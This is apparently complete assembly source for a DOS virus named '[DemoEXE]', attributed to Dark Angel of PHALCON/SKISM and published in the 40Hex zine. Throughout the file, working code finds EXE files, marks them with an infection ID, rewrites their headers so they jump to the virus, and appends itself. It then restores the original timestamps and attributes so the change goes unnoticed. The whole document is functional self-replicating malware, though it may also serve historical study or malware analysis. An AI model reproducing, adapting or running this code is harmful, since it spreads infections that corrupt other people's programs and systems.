  .model tiny                             ; Handy TASM directive
  .code                                   ; Virus code segment
            org 100h                      ; COM file starting IP
  ; Cheesy EXE infector
  ; Written by Dark Angel of PHALCON/SKISM
  ; For 40Hex Number 8 Volume 2 Issue 4
  id = 'DA'                               ; ID word for EXE infections
  startvirus:                             ; virus code starts here
            call next                     ; calculate delta offset
  next:     pop  bp                       ; bp = IP next
            sub  bp,offset next           ; bp = delta offset
            push ds
            push es
            push cs                       ; DS = CS
            pop  ds
            push cs                       ; ES = CS
            pop  es
            lea  si,[bp+jmpsave2]
            lea  di,[bp+jmpsave]
            movsw
            movsw
            movsw
            movsw
            mov  ah,1Ah                   ; Set new DTA
            lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
            int  21h
            lea  dx,[bp+exe_mask]
            mov  ah,4eh                   ; find first file
            mov  cx,7                     ; any attribute
  findfirstnext:
            int  21h                      ; DS:DX points to mask
            jc   done_infections          ; No mo files found
            mov  al,0h                    ; Open read only
            call open
            mov  ah,3fh                   ; Read file to buffer
            lea  dx,[bp+buffer]           ; @ DS:DX
            mov  cx,1Ah                   ; 1Ah bytes
            int  21h
            mov  ah,3eh                   ; Close file
            int  21h
  checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
            jnz  infect_exe
  find_next:
            mov  ah,4fh                   ; find next file
            jmp  short findfirstnext
  done_infections:
            mov  ah,1ah                   ; restore DTA to default
            mov  dx,80h                   ; DTA in PSP
            pop  es
            pop  ds                       ; DS->PSP
            int  21h
            mov  ax,es                    ; AX = PSP segment
            add  ax,10h                   ; Adjust for PSP
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ; Clear intrpts for stack manip.
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                     ; jmp ssss:oooo
  jmpsave             dd ?                ; Original CS:IP
  stacksave           dd ?                ; Original SS:SP
  jmpsave2            dd 0fff00000h       ; Needed for carrier file
  stacksave2          dd ?
  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
  virusname           db '[DemoEXE] for 40Hex',0
  infect_exe:
            les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
            mov  word ptr [bp+jmpsave2], ax
            mov  word ptr [bp+jmpsave2+2], es
            les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
            mov  word ptr [bp+stacksave2], es
            mov  word ptr [bp+stacksave2+2], ax
            mov  ax, word ptr [bp+buffer + 8] ; Get header size
            mov  cl, 4                        ; convert to bytes
            shl  ax, cl
            xchg ax, bx
            les  ax, [bp+offset newDTA+26]; Get file size
            mov  dx, es                   ; to DX:AX
            push ax
            push dx
            sub  ax, bx                   ; Subtract header size from
            sbb  dx, 0                    ; file size
            mov  cx, 10h                  ; Convert to segment:offset
            div  cx                       ; form
            mov  word ptr [bp+buffer+14h], dx ; New entry point
            mov  word ptr [bp+buffer+16h], ax
            mov  word ptr [bp+buffer+0Eh], ax ; and stack
            mov  word ptr [bp+buffer+10h], id
            pop  dx                       ; get file length
            pop  ax
            add  ax, heap-startvirus      ; add virus size
            adc  dx, 0
            mov  cl, 9                    ; 2**9 = 512
            push ax
            shr  ax, cl
            ror  dx, cl
            stc
            adc  dx, ax                   ; filesize in pages
            pop  ax
            and  ah, 1                    ; mod 512
            mov  word ptr [bp+buffer+4], dx ; new file size
            mov  word ptr [bp+buffer+2], ax
            push cs                       ; restore ES
            pop  es
            mov  cx, 1ah
  finishinfection:
            push cx                       ; Save # bytes to write
            xor  cx,cx                    ; Clear attributes
            call attributes               ; Set file attributes
            mov  al,2
            call open
            mov  ah,40h                   ; Write to file
            lea  dx,[bp+buffer]           ; Write from buffer
            pop  cx                       ; cx bytes
            int  21h
            mov  ax,4202h                 ; Move file pointer
            xor  cx,cx                    ; to end of file
            cwd                           ; xor dx,dx
            int  21h
            mov  ah,40h                   ; Concatenate virus
            lea  dx,[bp+startvirus]
            mov  cx,heap-startvirus       ; # bytes to write
            int  21h
            mov  ax,5701h                 ; Restore creation date/time
            mov  cx,word ptr [bp+newDTA+16h] ; time
            mov  dx,word ptr [bp+newDTA+18h] ; date
            int  21h
            mov  ah,3eh                   ; Close file
            int  21h
            mov ch,0
            mov cl,byte ptr [bp+newDTA+15h] ; Restore original
            call attributes                 ; attributes
  mo_infections: jmp find_next
  open:
            mov  ah,3dh
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            xchg ax,bx
            ret
  attributes:
            mov  ax,4301h                 ; Set attributes to cx
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            ret
  exe_mask            db '*.exe',0
  heap:                                   ; Variables not in code
  newDTA              db 42 dup (?)       ; Temporary DTA
  buffer              db 1ah dup (?)      ; read buffer
  endheap:                                ; End of virus
  end       startvirus
